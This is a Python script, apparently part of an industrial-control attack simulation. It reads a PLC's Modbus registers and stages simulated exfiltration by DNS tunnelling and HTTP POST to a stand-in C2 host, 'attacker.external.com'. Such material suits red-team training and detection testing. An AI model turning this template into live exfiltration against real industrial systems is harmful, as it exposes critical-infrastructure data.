#!/usr/bin/env python3
"""
05_data_exfil.py: Simulated data exfiltration via OT protocols.

Reads sensitive register data via Modbus, encodes payload, and
simulates exfiltration via DNS tunneling and HTTP channels.
"""

import base64
import json
import logging
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Any

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

# Configure logging
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class DataExfiltration:
    """Simulates covert data exfiltration from OT systems."""

    def __init__(
        self,
        plc_host: str = "192.168.1.100",
        plc_port: int = 502,
        c2_server: str = "attacker.external.com"
    ):
        """
        Initialize exfiltration module.

        Args:
            plc_host: Target PLC/RTU IP address.
            plc_port: Modbus TCP port.
            c2_server: Command and control server domain.
        """
        self.plc_host = plc_host
        self.plc_port = plc_port
        self.c2_server = c2_server
        self.modbus_client = ModbusTcpClient(host=plc_host, port=plc_port, timeout=10)
        self.exfil_log = []

    def connect(self) -> bool:
        """Connect to PLC."""
        try:
            if self.modbus_client.connect():
                logger.warning(f"Connected to PLC at {self.plc_host}:{self.plc_port}")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection failed: {str(e)}")
            return False

    def read_sensitive_registers(self) -> Optional[bytes]:
        """
        Read sensitive operational data from PLC registers.

        Returns:
            Encoded sensitive data or None on failure.
        """
        try:
            # Read multiple register ranges
            sensitive_data = []

            result = self.modbus_client.read_holding_registers(
                address=0, count=20, slave=1
            )

            if not result.isError():
                sensitive_data.extend(result.registers)
                logger.warning(f"Exfil: Read {len(result.registers)} sensitive registers")

            result = self.modbus_client.read_input_registers(
                address=0, count=20, slave=1
            )

            if not result.isError():
                sensitive_data.extend(result.registers)
                logger.warning(f"Exfil: Read {len(result.registers)} sensor inputs")

            # Encode sensitive data
            if sensitive_data:
                data_bytes = bytes(sensitive_data)
                encoded_payload = base64.b64encode(data_bytes).decode('utf-8')
                return encoded_payload.encode('utf-8')

            return None

        except Exception as e:
            logger.error(f"Read failed: {str(e)}")
            return None

    def exfil_via_dns_tunnel(self, payload: bytes) -> bool:
        """
        Simulate DNS tunneling exfiltration.

        Args:
            payload: Data to exfiltrate.

        Returns:
            True if successful, False otherwise.
        """
        try:
            # Simulate DNS queries with encoded payload
            dns_subdomains = []
            decoded = payload.decode('utf-8')

            # Split payload into chunks (DNS label size limit)
            chunk_size = 32
            for i in range(0, len(decoded), chunk_size):
                chunk = decoded[i:i+chunk_size]
                dns_domain = f"{chunk}.{self.c2_server}"
                dns_subdomains.append(dns_domain)

            exfil_record = {
                "timestamp": datetime.utcnow().isoformat(),
                "method": "dns_tunneling",
                "c2_server": self.c2_server,
                "dns_queries_simulated": len(dns_subdomains),
                "payload_size_bytes": len(payload),
                "success": True
            }

            self.exfil_log.append(exfil_record)
            logger.warning(f"Exfil: DNS tunnel - {len(dns_subdomains)} queries to {self.c2_server}")
            return True

        except Exception as e:
            logger.error(f"DNS exfil failed: {str(e)}")
            return False

    def exfil_via_http(self, payload: bytes) -> bool:
        """
        Simulate HTTP exfiltration.

        Args:
            payload: Data to exfiltrate.

        Returns:
            True if successful, False otherwise.
        """
        try:
            exfil_record = {
                "timestamp": datetime.utcnow().isoformat(),
                "method": "http_post",
                "c2_server": f"http://{self.c2_server}/exfil",
                "payload_size_bytes": len(payload),
                "http_method": "POST",
                "content_encoding": "base64",
                "success": True
            }

            self.exfil_log.append(exfil_record)
            logger.warning(f"Exfil: HTTP POST - {len(payload)} bytes to {self.c2_server}")
            return True

        except Exception as e:
            logger.error(f"HTTP exfil failed: {str(e)}")
            return False

    def execute_exfiltration(self) -> Dict[str, Any]:
        """
        Execute complete data exfiltration operation.

        Returns:
            Summary of exfiltration.
        """
        logger.warning("=== INITIATING DATA EXFILTRATION ===")

        summary = {
            "timestamp": datetime.utcnow().isoformat(),
            "plc_target": self.plc_host,
            "c2_server": self.c2_server,
            "stages": []
        }

        # Stage 1: Read sensitive data
        logger.warning("Stage 1: Reading sensitive registers...")
        payload = self.read_sensitive_registers()

        if payload:
            # Stage 2: DNS tunneling
            logger.warning("Stage 2: Exfil via DNS tunnel...")
            self.exfil_via_dns_tunnel(payload)

            time.sleep(2)

            # Stage 3: HTTP exfiltration
            logger.warning("Stage 3: Exfil via HTTP...")
            self.exfil_via_http(payload)

            summary["payload_obtained"] = True
            summary["payload_size"] = len(payload)
        else:
            summary["payload_obtained"] = False

        summary["exfil_methods_used"] = len(self.exfil_log)
        logger.warning(f"Exfiltration complete: {len(self.exfil_log)} operations")

        return summary

    def disconnect(self) -> None:
        """Close connections."""
        self.modbus_client.close()
        logger.info("Disconnected")

    def export_log(self, filepath: str) -> None:
        """Export exfil log to JSON."""
        try:
            with open(filepath, 'w') as f:
                json.dump(self.exfil_log, f, indent=2)
            logger.info(f"Exfil log exported to {filepath}")
        except Exception as e:
            logger.error(f"Export failed: {str(e)}")


def main() -> int:
    """Execute data exfiltration."""
    exfil = DataExfiltration(
        plc_host="192.168.1.100",
        c2_server="attacker.external.com"
    )

    if not exfil.connect():
        return 1

    try:
        summary = exfil.execute_exfiltration()
        exfil.export_log("/tmp/exfil.json")

        print(json.dumps(summary, indent=2))
        return 0

    finally:
        exfil.disconnect()


if __name__ == "__main__":
    sys.exit(main())
